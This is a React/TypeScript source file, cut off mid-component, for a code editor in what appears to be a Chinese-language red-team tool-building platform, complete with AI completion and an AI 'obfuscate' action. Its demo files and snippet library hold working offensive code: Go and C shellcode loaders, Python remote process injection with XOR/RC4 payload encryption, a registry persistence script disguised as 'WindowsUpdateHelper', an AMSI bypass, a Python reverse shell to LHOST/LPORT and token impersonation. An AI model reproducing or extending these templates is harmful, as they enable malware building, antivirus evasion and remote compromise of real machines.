import { useState, useRef, useEffect, useCallback } from "react";
import Editor, { type Monaco } from "@monaco-editor/react";
import { trpc } from "@/lib/trpc";
import { useApp } from "@/contexts/AppContext";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { ScrollArea } from "@/components/ui/scroll-area";
import { toast } from "sonner";
import { cn } from "@/lib/utils";
import {
  FileCode, FolderOpen, Plus, X, Save, Terminal, GitBranch,
  File, Folder, Bot, Code2, Layers, Package, Zap, RefreshCw,
  Search, Settings, CheckCircle2, Circle, GitCommit, GitMerge,
  ChevronRight, ChevronDown, Sparkles, Cpu, Activity, Hash,
  Eye, EyeOff, Copy, Download, Upload, MoreHorizontal
} from "lucide-react";
import {
  ContextMenu, ContextMenuContent, ContextMenuItem,
  ContextMenuSeparator, ContextMenuTrigger, ContextMenuSub,
  ContextMenuSubContent, ContextMenuSubTrigger
} from "@/components/ui/context-menu";
import {
  ResizableHandle, ResizablePanel, ResizablePanelGroup
} from "@/components/ui/resizable";
import {
  DropdownMenu, DropdownMenuContent, DropdownMenuItem,
  DropdownMenuTrigger, DropdownMenuSeparator
} from "@/components/ui/dropdown-menu";

// ─── Demo files ────────────────────────────────────────────────────────────
const DEMO_FILES = [
  {
    id: 1, name: "main.go", path: "/main.go", language: "go",
    content: `package main

import (
\t"fmt"
\t"os"
\t"syscall"
\t"unsafe"
)

// Shellcode loader - for authorized security research only
func main() {
\tshellcode := []byte{
\t\t// TODO: Add shellcode bytes
\t\t0x90, 0x90, 0x90, // NOP sled
\t}

\taddr, err := syscall.VirtualAlloc(
\t\t0,
\t\tuintptr(len(shellcode)),
\t\tsyscall.MEM_COMMIT|syscall.MEM_RESERVE,
\t\tsyscall.PAGE_EXECUTE_READWRITE,
\t)
\tif err != nil {
\t\tfmt.Fprintf(os.Stderr, "VirtualAlloc failed: %v\\n", err)
\t\tos.Exit(1)
\t}

\t// Copy shellcode to allocated memory
\tcopy((*[1 << 30]byte)(unsafe.Pointer(addr))[:len(shellcode)], shellcode)

\t// Execute shellcode via syscall
\tsyscall.Syscall(addr, 0, 0, 0, 0)
}`
  },
  {
    id: 2, name: "loader.c", path: "/loader.c", language: "c",
    content: `#include <windows.h>
#include <stdio.h>

// Reflective DLL Injection loader
// Target: Windows x64

unsigned char shellcode[] = {
    0x90, 0x90, 0x90  // NOP sled placeholder
};

int main(int argc, char* argv[]) {
    LPVOID pMem = VirtualAlloc(
        NULL,
        sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (!pMem) {
        fprintf(stderr, "VirtualAlloc failed: %lu\\n", GetLastError());
        return 1;
    }

    memcpy(pMem, shellcode, sizeof(shellcode));

    HANDLE hThread = CreateThread(
        NULL, 0,
        (LPTHREAD_START_ROUTINE)pMem,
        NULL, 0, NULL
    );

    WaitForSingleObject(hThread, INFINITE);
    VirtualFree(pMem, 0, MEM_RELEASE);
    return 0;
}`
  },
  {
    id: 3, name: "evasion.py", path: "/evasion.py", language: "python",
    content: `#!/usr/bin/env python3
"""
AV Evasion Module - Authorized Security Research
"""

import ctypes
import struct
import base64


def xor_encrypt(data: bytes, key: bytes) -> bytes:
    """XOR encrypt shellcode with rotating key"""
    result = bytearray()
    for i, byte in enumerate(data):
        result.append(byte ^ key[i % len(key)])
    return bytes(result)


def rc4_encrypt(data: bytes, key: bytes) -> bytes:
    """RC4 encryption for shellcode obfuscation"""
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]

    i = j = 0
    result = []
    for byte in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        result.append(byte ^ S[(S[i] + S[j]) % 256])

    return bytes(result)


def inject_shellcode(shellcode: bytes, pid: int) -> bool:
    """Inject shellcode into target process"""
    kernel32 = ctypes.windll.kernel32

    hProcess = kernel32.OpenProcess(0x1F0FFF, False, pid)
    if not hProcess:
        return False

    pMem = kernel32.VirtualAllocEx(
        hProcess, None, len(shellcode),
        0x3000, 0x40
    )

    kernel32.WriteProcessMemory(hProcess, pMem, shellcode, len(shellcode), None)
    kernel32.CreateRemoteThread(hProcess, None, 0, pMem, None, 0, None)
    return True`
  },
  {
    id: 4, name: "persist.ps1", path: "/persist.ps1", language: "powershell",
    content: `# Persistence via Registry Run Key
# MITRE ATT&CK: T1547.001

$RegPath = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
$Name = "WindowsUpdateHelper"
$Value = $MyInvocation.MyCommand.Path

# Add registry key for persistence
Set-ItemProperty -Path $RegPath -Name $Name -Value $Value

Write-Host "[+] Persistence established via Run key"
Write-Host "[+] Key: $RegPath\\$Name"
Write-Host "[+] Value: $Value"`
  },
];

const SNIPPETS = [
  { name: "Shellcode Loader (Go)", lang: "go", category: "loader", code: `// Shellcode loader\nfunc loadShellcode(sc []byte) {\n\taddr, _ := syscall.VirtualAlloc(0, uintptr(len(sc)), syscall.MEM_COMMIT, syscall.PAGE_EXECUTE_READWRITE)\n\tcopy((*[1<<30]byte)(unsafe.Pointer(addr))[:], sc)\n\tsyscall.Syscall(addr, 0, 0, 0, 0)\n}` },
  { name: "Process Injection (C)", lang: "c", category: "injection", code: `// Classic process injection\nHANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);\nLPVOID pMem = VirtualAllocEx(hProc, NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\nWriteProcessMemory(hProc, pMem, shellcode, size, NULL);\nCreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pMem, NULL, 0, NULL);` },
  { name: "AMSI Bypass (PS)", lang: "powershell", category: "evasion", code: `# AMSI Bypass\n$a=[Ref].Assembly.GetTypes()\nForeach($b in $a){if($b.Name -like "*iUtils"){$c=$b}}\n$d=$c.GetFields('NonPublic,Static')\nForeach($e in $d){if($e.Name -like "*Context"){$f=$e}}\n$g=$f.GetValue($null)\n[IntPtr]$ptr=$g\n[Int32[]]$buf=@(0)\n[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)` },
  { name: "Rev Shell (Python)", lang: "python", category: "shell", code: `import socket,subprocess,os\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect(("LHOST",LPORT))\nos.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\nsubprocess.call(["/bin/sh","-i"])` },
  { name: "XOR Encrypt (C)", lang: "c", category: "evasion", code: `void xor_encrypt(unsigned char* data, int len, unsigned char key) {\n    for (int i = 0; i < len; i++) {\n        data[i] ^= key;\n    }\n}` },
  { name: "Token Impersonation (C)", lang: "c", category: "privesc", code: `HANDLE hToken = NULL;\nOpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken);\nHANDLE hDup = NULL;\nDuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenImpersonation, &hDup);\nImpersonateLoggedOnUser(hDup);` },
];

const GIT_CHANGES = [
  { file: "main.go", status: "M", lines: "+12 -3" },
  { file: "loader.c", status: "A", lines: "+48 -0" },
  { file: "evasion.py", status: "M", lines: "+5 -2" },
];

// ─── Terminal ──────────────────────────────────────────────────────────────
function TerminalPanel({ visible }: { visible: boolean }) {
  const [lines, setLines] = useState([
    { type: "info", text: "渗透测试工具开发系统 — 终端 v1.0" },
    { type: "info", text: "已连接到构建环境 · Go 1.21 · GCC 12.3" },
    { type: "prompt", text: "" },
  ]);
  const [input, setInput] = useState("");
  const endRef = useRef<HTMLDivElement>(null);

  useEffect(() => { endRef.current?.scrollIntoView({ behavior: "smooth" }); }, [lines]);

  const handleCommand = (cmd: string) => {
    const newLines = [...lines.slice(0, -1), { type: "cmd", text: `$ ${cmd}` }];
    const cmds: Record<string, string[]> = {
      help: ["可用命令: help, clear, build, run, ls, pwd, whoami, go build, gcc"],
      ls: ["main.go  loader.c  evasion.py  persist.ps1  Makefile  go.mod"],
      pwd: ["/workspace/operation-phantom"],
      whoami: ["redteam-operator"],
      "go build": ["[+] 编译中...", "[+] go build -o payload main.go", "[✓] 构建成功: payload (156KB)"],
      "gcc loader.c -o loader": ["[+] 编译中...", "[✓] 构建成功: loader (23KB)"],
      build: ["[+] 启动构建流水线...", "[+] 编译 main.go...", "[+] 混淆处理...", "[+] 打包...", "[✓] 构建完成 · 耗时 8.4s · 产物: payload.exe (156KB)"],
      clear: [],
    };
    if (cmd === "clear") { setLines([{ type: "prompt", text: "" }]); setInput(""); return; }
    const output = cmds[cmd] ?? [`bash: ${cmd}: 命令未找到`];
    output.forEach(line => newLines.push({ type: line.startsWith("[✓]") ? "success" : line.startsWith("[+]") ? "info" : line.startsWith("bash:") ? "error" : "output", text: line }));
    newLines.push({ type: "prompt", text: "" });
    setLines(newLines);
    setInput("");
  };

  if (!visible) return null;

  return (
    <div className="h-full flex flex-col bg-[var(--editor-bg)] font-mono text-xs dark-scroll">
      <div className="flex items-center gap-2 px-3 py-1.5 border-b border-[var(--editor-border)] shrink-0 bg-[var(--editor-tab)]">
        <Terminal className="w-3 h-3 text-green-400" />
        <span className="text-green-400 text-[11px] font-semibold">终端</span>
        <div className="ml-auto flex gap-1.5">
          <div className="w-2.5 h-2.5 rounded-full bg-red-500" />
          <div className="w-2.5 h-2.5 rounded-full bg-yellow-500" />
          <div className="w-2.5 h-2.5 rounded-full bg-green-500" />
        </div>
      </div>
      <ScrollArea className="flex-1 p-3">
        {lines.map((line, i) => (
          <div key={i} className={cn("leading-5 mb-0.5",
            line.type === "error" ? "text-red-400" :
            line.type === "success" ? "text-green-400" :
            line.type === "info" ? "text-blue-400" :
            line.type === "cmd" ? "text-yellow-300" :
            "text-[var(--editor-fg)]"
          )}>
            {line.type === "prompt" ? (
              <div className="flex items-center">
                <span className="text-green-400 mr-1">❯</span>
                <input value={input} onChange={e => setInput(e.target.value)}
                  onKeyDown={e => { if (e.key === "Enter") handleCommand(input); }}
                  className="flex-1 bg-transparent outline-none text-[var(--editor-fg)] caret-green-400" autoFocus />
              </div>
            ) : <span>{line.text}</span>}
          </div>
        ))}
        <div ref={endRef} />
      </ScrollArea>
    </div>
  );
}

// ─── Git Panel ─────────────────────────────────────────────────────────────
function GitPanel({ visible }: { visible: boolean }) {
  const [commitMsg, setCommitMsg] = useState("");
  if (!visible) return null;
  return (
    <div className="h-full flex flex-col bg-[#0f1117] border-l border-[var(--editor-border)]">
      <div className="flex items-center gap-2 px-3 py-2 border-b border-[var(--editor-border)] shrink-0">
        <GitBranch className="w-3.5 h-3.5 text-orange-400" />
        <span className="text-[11px] text-white font-semibold">Git — main</span>
      </div>
      <ScrollArea className="flex-1 p-2">
        <p className="text-[10px] text-[var(--sidebar-section)] uppercase tracking-widest font-bold px-1 mb-2">变更文件</p>
        {GIT_CHANGES.map(f => (
          <div key={f.file} className="flex items-center gap-2 px-2 py-1.5 rounded-lg hover:bg-[var(--sidebar-hover)] cursor-pointer group">
            <span className={cn("text-[10px] font-bold w-4 shrink-0", f.status === "M" ? "text-yellow-400" : "text-green-400")}>{f.status}</span>
            <span className="text-[11px] text-[var(--sidebar-fg)] font-mono flex-1 truncate">{f.file}</span>
            <span className="text-[10px] text-green-400 opacity-0 group-hover:opacity-100">{f.lines}</span>
          </div>
        ))}
        <div className="mt-3 px-1">
          <input value={commitMsg} onChange={e => setCommitMsg(e.target.value)}
            placeholder="提交信息..." className="w-full bg-[var(--editor-line)] border border-[var(--editor-border)] rounded-lg px-2 py-1.5 text-[11px] text-[var(--editor-fg)] outline-none focus:border-[var(--primary)] placeholder:text-[var(--sidebar-section)]" />
          <Button size="sm" className="w-full mt-2 h-7 text-xs bg-grad-primary border-0"
            onClick={() => { toast.success("已提交: " + (commitMsg || "Update")); setCommitMsg(""); }}>
            <GitCommit className="w-3 h-3 mr-1.5" /> 提交
          </Button>
        </div>
      </ScrollArea>
    </div>
  );
}

// ─── AI Inline Completion Hook ─────────────────────────────────────────────
function useAIInlineCompletion(editorRef: React.MutableRefObject<any>, monacoRef: React.MutableRefObject<Monaco | null>, language: string, enabled: boolean) {
  const [ghostText, setGhostText] = useState<string | null>(null);
  const [isLoading, setIsLoading] = useState(false);
  const debounceRef = useRef<ReturnType<typeof setTimeout> | undefined>(undefined);
  const decorationsRef = useRef<string[]>([]);
  const completeMutation = trpc.ai.complete.useMutation({
    onSuccess: (data) => {
      setIsLoading(false);
      if (!data.completion || !editorRef.current || !monacoRef.current) return;
      const rawCompletion = typeof data.completion === "string" ? data.completion : String(data.completion ?? "");
      const completion = rawCompletion.replace(/^```[\w]*\n?/, "").replace(/\n?```$/, "").trim();
      if (!completion) return;
      setGhostText(completion);
      showGhostDecoration(completion);
    },
    onError: () => { setIsLoading(false); setGhostText(null); },
  });

  const showGhostDecoration = useCallback((text: string) => {
    const editor = editorRef.current;
    const monaco = monacoRef.current;
    if (!editor || !monaco) return;
    const position = editor.getPosition();
    if (!position) return;
    // Clear old decorations
    decorationsRef.current = editor.deltaDecorations(decorationsRef.current, []);
    // Show inline ghost text via decoration
    const firstLine = text.split("\n")[0];
    decorationsRef.current = editor.deltaDecorations([], [{
      range: new monaco.Range(position.lineNumber, position.column, position.lineNumber, position.column),
      options: {
        after: {
          content: firstLine,
          inlineClassName: "ai-ghost-text",
        },
        description: "ai-completion",
      },
    }]);
  }, [editorRef, monacoRef]);

  const clearGhost = useCallback(() => {
    setGhostText(null);
    if (editorRef.current) {
      decorationsRef.current = editorRef.current.deltaDecorations(decorationsRef.current, []);
    }
  }, [editorRef]);

  const triggerCompletion = useCallback((code: string, cursorPosition: number) => {
    if (!enabled) return;
    clearTimeout(debounceRef.current);
    debounceRef.current = setTimeout(() => {
      if (code.length < 10) return;
      setIsLoading(true);
      completeMutation.mutate({ code, language, cursorPosition });
    }, 1200); // 1.2s debounce
  }, [enabled, language, completeMutation, clearGhost]);

  const acceptCompletion = useCallback(() => {
    if (!ghostText || !editorRef.current) return false;
    const editor = editorRef.current;
    const position = editor.getPosition();
    if (!position) return false;
    editor.executeEdits("ai-accept", [{
      range: { startLineNumber: position.lineNumber, startColumn: position.column, endLineNumber: position.lineNumber, endColumn: position.column },
      text: ghostText,
    }]);
    clearGhost();
    toast.success("AI 补全已接受", { duration: 1500 });
    return true;
  }, [ghostText, editorRef, clearGhost]);

  return { ghostText, isLoading, triggerCompletion, acceptCompletion, clearGhost };
}

// ─── Main Editor ───────────────────────────────────────────────────────────
export default function CodeEditor() {
  const { activeProjectId, setAssistantContext, setActiveModule } = useApp();
  const [openTabs, setOpenTabs] = useState([1, 2]);
  const [activeTab, setActiveTab] = useState(1);
  const [showTerminal, setShowTerminal] = useState(false);
  const [showSnippets, setShowSnippets] = useState(false);
  const [showGit, setShowGit] = useState(false);
  const [aiEnabled, setAiEnabled] = useState(true);
  const [snippetCategory, setSnippetCategory] = useState("all");
  const [fileContents, setFileContents] = useState<Record<number, string>>(
    Object.fromEntries(DEMO_FILES.map(f => [f.id, f.content]))
  );
  const [aiLoading, setAiLoading] = useState(false);
  const editorRef = useRef<any>(null);
  const monacoRef = useRef<Monaco | null>(null);

  const activeFile = DEMO_FILES.find(f => f.id === activeTab);
  const { ghostText, isLoading: completionLoading, triggerCompletion, acceptCompletion, clearGhost } = useAIInlineCompletion(editorRef, monacoRef, activeFile?.language ?? "go", aiEnabled);

  const aiOp = trpc.ai.codeOperation.useMutation({
    onSuccess: (data) => {
      const rawContent = data.content;
      const contentStr = typeof rawContent === "string" ? rawContent : String(rawContent ?? "");
      if (editorRef.current) {
        const editor = editorRef.current;
        const selection = editor.getSelection();
        if (selection) {
          editor.executeEdits("ai-op", [{
            range: { startLineNumber: selection.endLineNumber + 1, startColumn: 1, endLineNumber: selection.endLineNumber + 1, endColumn: 1 },
            text: `\n/* ── AI Result ──\n${contentStr}\n*/\n`,
          }]);
        }
      }
      toast.success("AI 操作完成");
      setAiLoading(false);
    },
    onError: () => { toast.error("AI 操作失败"); setAiLoading(false); },
  });

  const handleEditorMount = (editor: any, monaco: Monaco) => {
    editorRef.current = editor;
    monacoRef.current = monaco;

    // Custom dark theme
    monaco.editor.defineTheme("pentest-dark", {
      base: "vs-dark", inherit: true,
      rules: [
        { token: "comment", foreground: "5c6370", fontStyle: "italic" },
        { token: "keyword", foreground: "c678dd" },
        { token: "string", foreground: "98c379" },
        { token: "number", foreground: "d19a66" },
        { token: "type", foreground: "56b6c2" },
        { token: "function", foreground: "61afef" },
        { token: "variable", foreground: "e06c75" },
      ],
      colors: {
        "editor.background": "#13141f",
        "editor.foreground": "#abb2bf",
        "editor.lineHighlightBackground": "#1e2030",
        "editorLineNumber.foreground": "#3b4048",
        "editorLineNumber.activeForeground": "#6366f1",
        "editor.selectionBackground": "#3e4451",
        "editorCursor.foreground": "#6366f1",
        "editorIndentGuide.background1": "#2c313a",
        "editorIndentGuide.activeBackground1": "#3b4048",
      },
    });
    monaco.editor.setTheme("pentest-dark");

    // Inject ghost text CSS
    const style = document.createElement("style");
    style.textContent = `.ai-ghost-text { color: #5c6370 !important; font-style: italic; }`;
    document.head.appendChild(style);

    // Tab key to accept AI completion
    editor.addCommand(monaco.KeyCode.Tab, () => {
      if (ghostText) {
        acceptCompletion();
      } else {
        editor.trigger("keyboard", "tab", {});
      }
    });

    // Escape to dismiss ghost
    editor.addCommand(monaco.KeyCode.Escape, () => {
      clearGhost();
    });

    // Trigger completion on content change
    editor.onDidChangeModelContent(() => {
      const model = editor.getModel();
      const pos = editor.getPosition();
      if (model && pos) {
        const offset = model.getOffsetAt(pos);
        triggerCompletion(model.getValue(), offset);
      }
    });
  };

  const handleAiOperation = (op: "explain" | "obfuscate" | "deobfuscate" | "rewrite" | "audit") => {
    const selection = editorRef.current?.getSelection();
    const model = editorRef.current?.getModel();
    const code = (selection && model && !selection.isEmpty()) ? model.getValueInRange(selection) : fileContents[activeTab] ?? "";
    if (!code) { toast.warning("请先选择代码"); return; }
    setAiLoading(true);
    clearGhost();
    aiOp.mutate({ operation: op, code, language: activeFile?.language });
  };

  const openTab = (fileId: number) => {
    if (!openTabs.includes(fileId)) setOpenTabs(prev => [...prev, fileId]);
    setActiveTab(fileId);
  };

  const closeTab = (fileId: number, e: React.MouseEvent) => {
    e.stopPropagation();
    const newTabs = openTabs.filter(id => id !== fileId);
    setOpenTabs(newTabs);
    if (activeTab === fileId && newTabs.length > 0) setActiveTab(newTabs[newTabs.length - 1]);
  };

  const filteredSnippets = snippetCategory === "all" ? SNIPPETS : SNIPPETS.filter(s => s.category === snippetCategory);

  return (
    <div className="h-full flex flex-col bg-[var(--editor-bg)]">
      {/* Toolbar */}
      <div className="flex items-center gap-1 px-3 py-1.5 border-b border-[var(--editor-border)] bg-[var(--editor-tab)] shrink-0">
        <div className="flex items-center gap-0.5">
          {[
            { icon: Layers, label: "片段库", key: "snippets", active: showSnippets, toggle: () => setShowSnippets(!showSnippets) },
            { icon: Terminal, label: "终端", key: "terminal", active: showTerminal, toggle: () => setShowTerminal(!showTerminal) },
            { icon: GitBranch, label: "Git", key: "git", active: showGit, toggle: () => setShowGit(!showGit) },
          ].map(item => (
            <Button key={item.key} variant="ghost" size="icon" title={item.label}
              className={cn("w-7 h-7 text-[var(--editor-fg)] hover:bg-[var(--editor-line)]", item.active && "bg-[var(--editor-line)] text-white")}
              onClick={item.toggle}>
              <item.icon className="w-3.5 h-3.5" />
            </Button>
          ))}
        </div>

        <div className="w-px h-4 bg-[var(--editor-border)] mx-1" />

        {/* AI Operations */}
        <div className="flex items-center gap-0.5">
          {[
            { label: "解释", op: "explain" as const, color: "text-blue-400" },
            { label: "混淆", op: "obfuscate" as const, color: "text-amber-400" },
            { label: "反混淆", op: "deobfuscate" as const, color: "text-green-400" },
            { label: "重写", op: "rewrite" as const, color: "text-purple-400" },
            { label: "审计", op: "audit" as const, color: "text-red-400" },
          ].map(item => (
            <Button key={item.op} variant="ghost" size="sm"
              className={cn("h-6 px-2 text-[10px] hover:bg-[var(--editor-line)] gap-1", item.color)}
              onClick={() => handleAiOperation(item.op)} disabled={aiLoading}>
              <Bot className="w-3 h-3" />{item.label}
            </Button>
          ))}
        </div>

        <div className="ml-auto flex items-center gap-1.5">
          {/* AI completion toggle */}
          <button
            onClick={() => setAiEnabled(!aiEnabled)}
            className={cn("flex items-center gap-1.5 px-2 py-1 rounded-lg text-[10px] font-medium transition-all border",
              aiEnabled ? "bg-purple-900/40 text-purple-300 border-purple-700" : "bg-[var(--editor-line)] text-[var(--sidebar-fg)] border-[var(--editor-border)]"
            )}
            title={aiEnabled ? "AI 补全已启用（Tab 接受）" : "AI 补全已禁用"}
          >
            <Sparkles className={cn("w-3 h-3", aiEnabled && "animate-pulse")} />
            AI 补全 {aiEnabled ? "ON" : "OFF"}
          </button>

          {completionLoading && (
            <div className="flex items-center gap-1 text-[10px] text-purple-400">
              <RefreshCw className="w-3 h-3 animate-spin" />
              <span>生成中...</span>
            </div>
          )}

          {ghostText && (
            <div className="flex items-center gap-1 text-[10px] text-purple-300 bg-purple-900/30 px-2 py-0.5 rounded border border-purple-700">
              <Sparkles className="w-3 h-3" />
              <span>Tab 接受补全</span>
              <button onClick={clearGhost} className="ml-1 hover:text-white">
                <X className="w-3 h-3" />
              </button>
            </div>
          )}

          <Button variant="ghost" size="sm" className="h-6 px-2 text-[10px] text-blue-400 hover:bg-[var(--editor-line)] gap-1"
            onClick={() => { setAssistantContext({ fileContent: fileContents[activeTab], fileName: activeFile?.name }); setActiveModule("assistant"); toast.success("已发送到 AI 助手"); }}>
            <Bot className="w-3 h-3" />发送到助手
          </Button>

          <Button variant="ghost" size="sm" className="h-6 px-2 text-[10px] text-green-400 hover:bg-[var(--editor-line)] gap-1"
            onClick={() => toast.success("文件已保存")}>
            <Save className="w-3 h-3" />保存
          </Button>
        </div>
      </div>

      <ResizablePanelGroup direction="horizontal" className="flex-1">
        {/* File Tree */}
        <ResizablePanel defaultSize={14} minSize={10} maxSize={22}>
          <div className="h-full flex flex-col bg-[#0d0e1a] border-r border-[var(--editor-border)]">
            <div className="flex items-center justify-between px-3 py-2 border-b border-[var(--editor-border)] shrink-0">
              <span className="text-[9px] text-[var(--sidebar-section)] uppercase tracking-[0.15em] font-bold">文件树</span>
              <Button variant="ghost" size="icon" className="w-5 h-5 text-[var(--sidebar-fg)] hover:text-white">
                <Plus className="w-3 h-3" />
              </Button>
            </div>
            <ScrollArea className="flex-1">
              <div className="p-1.5 space-y-0.5">
                <div className="flex items-center gap-1 px-2 py-1 text-[var(--sidebar-fg)] opacity-60">
                  <FolderOpen className="w-3 h-3 text-amber-400" />
                  <span className="text-[10px] font-semibold">operation-phantom</span>
                </div>
                {DEMO_FILES.map(file => {
                  const langColors: Record<string, string> = { go: "text-cyan-400", c: "text-blue-400", python: "text-yellow-400", powershell: "text-indigo-400" };
                  return (
                    <ContextMenu key={file.id}>
                      <ContextMenuTrigger>
                        <button onClick={() => openTab(file.id)}
                          className={cn("w-full flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-[11px] text-left transition-all",
                            activeTab === file.id ? "bg-[var(--sidebar-active-bg)] text-white" : "text-[var(--sidebar-fg)] hover:bg-[var(--sidebar-hover)] hover:text-white"
                          )}>
                          <FileCode className={cn("w-3 h-3 shrink-0", langColors[file.language] ?? "text-gray-400")} />
                          <span className="truncate font-mono">{file.name}</span>
                        </button>
                      </ContextMenuTrigger>
                      <ContextMenuContent className="text-xs">
                        <ContextMenuItem onClick={() => openTab(file.id)}>打开</ContextMenuItem>
                        <ContextMenuItem onClick={() => toast.info("重命名即将上线")}>重命名</ContextMenuItem>
                        <ContextMenuSeparator />
                        <ContextMenuItem className="text-destructive">删除</ContextMenuItem>
                      </ContextMenuContent>
                    </ContextMenu>
                  );
                })}
              </div>
            </ScrollArea>
          </div>
        </ResizablePanel>

        <ResizableHandle className="bg-[var(--editor-border)] w-px" />

        {/* Editor + Terminal */}
        <ResizablePanel defaultSize={showSnippets ? 65 : showGit ? 68 : 86}>
          <div className="h-full flex flex-col">
            {/* Tabs */}
            <div className="flex items-center bg-[var(--editor-tab)] border-b border-[var(--editor-border)] overflow-x-auto shrink-0">
              {openTabs.map(tabId => {
                const file = DEMO_FILES.find(f => f.id === tabId);
                if (!file) return null;
                const langColors: Record<string, string> = { go: "text-cyan-400", c: "text-blue-400", python: "text-yellow-400", powershell: "text-indigo-400" };
                return (
                  <div key={tabId} onClick={() => setActiveTab(tabId)}
                    className={cn(
                      "flex items-center gap-1.5 px-3 py-2 text-[11px] cursor-pointer border-r border-[var(--editor-border)] shrink-0 group transition-colors",
                      activeTab === tabId ? "bg-[var(--editor-bg)] text-white border-t-2 border-t-[var(--primary)]" : "text-[var(--sidebar-fg)] hover:bg-[var(--editor-bg)]/60"
                    )}>
                    <FileCode className={cn("w-3 h-3", langColors[file.language] ?? "text-gray-400")} />
                    <span className="font-mono">{file.name}</span>
                    <button onClick={(e) => closeTab(tabId, e)} className="w-3.5 h-3.5 rounded-sm hover:bg-white/20 flex items-center justify-center opacity-0 group-hover:opacity-100 transition-opacity">
                      <X className="w-2.5 h-2.5" />
                    </button>
                  </div>
                );
              })}
              <button onClick={() => toast.info("新建文件即将上线")} className="px-2 py-2 text-[var(--sidebar-fg)] hover:text-white transition-colors shrink-0">
                <Plus className="w-3.5 h-3.5" />
              </button>
            </div>

            <ResizablePanelGroup direction="vertical" className="flex-1">
              <ResizablePanel defaultSize={showTerminal ? 65 : 100}>
                <ContextMenu>
                  <ContextMenuTrigger className="h-full block">
                    <Editor
                      height="100%"
                      language={activeFile?.language ?? "go"}
                      value={fileContents[activeTab] ?? ""}
                      onChange={(val) => setFileContents(prev => ({ ...prev, [activeTab]: val ?? "" }))}
                      onMount={handleEditorMount}
                      options={{
                        fontSize: 13,
                        fontFamily: "'JetBrains Mono', 'Fira Code', monospace",
                        fontLigatures: true,
                        minimap: { enabled: true, scale: 1 },
                        lineNumbers: "on",
                        scrollBeyondLastLine: false,
                        wordWrap: "off",
                        tabSize: 4,
                        bracketPairColorization: { enabled: true },
                        guides: { bracketPairs: true, indentation: true },
                        smoothScrolling: true,
                        cursorBlinking: "phase",
                        cursorSmoothCaretAnimation: "on",
                        padding: { top: 12, bottom: 12 },
                        quickSuggestions: false, // Disable built-in suggestions, use our AI
                        suggestOnTriggerCharacters: false,
                        renderLineHighlight: "line",
                      }}
                    />
                  </ContextMenuTrigger>
                  <ContextMenuContent className="text-xs w-52">
                    <ContextMenuSub>
                      <ContextMenuSubTrigger className="gap-2">
                        <Bot className="w-3.5 h-3.5 text-purple-500" /> AI 操作
                      </ContextMenuSubTrigger>
                      <ContextMenuSubContent>
                        {[
                          { label: "解释代码", op: "explain" as const, color: "text-blue-500" },
                          { label: "重写代码", op: "rewrite" as const, color: "text-purple-500" },
                          { label: "混淆代码", op: "obfuscate" as const, color: "text-amber-500" },
                          { label: "反混淆", op: "deobfuscate" as const, color: "text-green-500" },
                          { label: "安全审计", op: "audit" as const, color: "text-red-500" },
                        ].map(item => (
                          <ContextMenuItem key={item.op} onClick={() => handleAiOperation(item.op)}>
                            <Bot className={cn("w-3.5 h-3.5 mr-2", item.color)} />{item.label}
                          </ContextMenuItem>
                        ))}
                      </ContextMenuSubContent>
                    </ContextMenuSub>
                    <ContextMenuSeparator />
                    <ContextMenuItem onClick={() => { setAssistantContext({ fileContent: fileContents[activeTab], fileName: activeFile?.name }); setActiveModule("assistant"); }}>
                      <Bot className="w-3.5 h-3.5 mr-2" /> 发送到 AI 助手
                    </ContextMenuItem>
                    <ContextMenuItem onClick={() => { navigator.clipboard.writeText(fileContents[activeTab] ?? ""); toast.success("已复制"); }}>
                      <Copy className="w-3.5 h-3.5 mr-2" /> 复制全部
                    </ContextMenuItem>
                  </ContextMenuContent>
                </ContextMenu>
              </ResizablePanel>

              {showTerminal && (
                <>
                  <ResizableHandle className="bg-[var(--editor-border)] h-px" />
                  <ResizablePanel defaultSize={35} minSize={20}>
                    <TerminalPanel visible={showTerminal} />
                  </ResizablePanel>
                </>
              )}
            </ResizablePanelGroup>
          </div>
        </ResizablePanel>

        {/* Snippets Panel */}
        {showSnippets && (
          <>
            <ResizableHandle className="bg-[var(--editor-border)] w-px" />
            <ResizablePanel defaultSize={21} minSize={15} maxSize={30}>
              <div className="h-full flex flex-col bg-[#0d0e1a] border-l border-[var(--editor-border)]">
                <div className="flex items-center justify-between px-3 py-2 border-b border-[var(--editor-border)] shrink-0">
                  <span className="text-[9px] text-[var(--sidebar-section)] uppercase tracking-[0.15em] font-bold">代码片段库</span>
                  <Button variant="ghost" size="icon" className="w-5 h-5 text-[var(--sidebar-fg)]" onClick={() => setShowSnippets(false)}>
                    <X className="w-3 h-3" />
                  </Button>
                </div>
                <div className="flex gap-1 p-1.5 border-b border-[var(--editor-border)] flex-wrap">
                  {["all", "loader", "injection", "evasion", "shell", "privesc"].map(cat => (
                    <button key={cat} onClick={() => setSnippetCategory(cat)}
                      className={cn("text-[9px] px-1.5 py-0.5 rounded font-medium transition-colors",
                        snippetCategory === cat ? "bg-[var(--primary)] text-white" : "text-[var(--sidebar-fg)] hover:bg-[var(--sidebar-hover)]"
                      )}>
                      {cat === "all" ? "全部" : cat}
                    </button>
                  ))}
                </div>
                <ScrollArea className="flex-1">
                  <div className="p-1.5 space-y-1.5">
                    {filteredSnippets.map((snippet, i) => (
                      <div key={i}
                        className="rounded-xl border border-[var(--editor-border)] overflow-hidden cursor-pointer hover:border-[var(--primary)] transition-all group"
                        onClick={() => {
                          if (editorRef.current) {
                            const editor = editorRef.current;
                            const selection = editor.getSelection();
                            editor.executeEdits("snippet", [{ range: selection, text: snippet.code }]);
